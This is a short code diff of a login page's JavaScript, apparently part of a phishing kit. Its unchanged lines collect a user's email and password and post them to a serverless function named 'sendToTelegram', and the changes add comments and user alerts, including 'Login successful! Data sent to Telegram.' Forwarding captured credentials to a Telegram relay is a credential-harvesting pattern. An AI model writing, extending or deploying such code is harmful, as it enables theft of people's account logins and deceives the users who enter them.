@@ -17,7 +17,7 @@ function validatePassword(password) {
     return password.length >= 8; // Password must be at least 8 characters
 }
 
-// Function to send data to a secure serverless function
+// Function to send data to the serverless function
 async function sendToServer(email, password) {
     const url = "/.netlify/functions/sendToTelegram"; // Netlify Function endpoint
     const payload = {
@@ -33,10 +33,20 @@ async function sendToServer(email, password) {
             },
             body: JSON.stringify(payload),
         });
+
+        // Parse the response
         const data = await response.json();
         console.log("Server response:", data);
+
+        // Check if the message was sent successfully
+        if (response.ok) {
+            alert("Login successful! Data sent to Telegram.");
+        } else {
+            alert("Failed to send data. Please try again.");
+        }
     } catch (error) {
         console.error("Error sending data to server:", error);
+        alert("An error occurred. Please try again.");
     }
 }
 
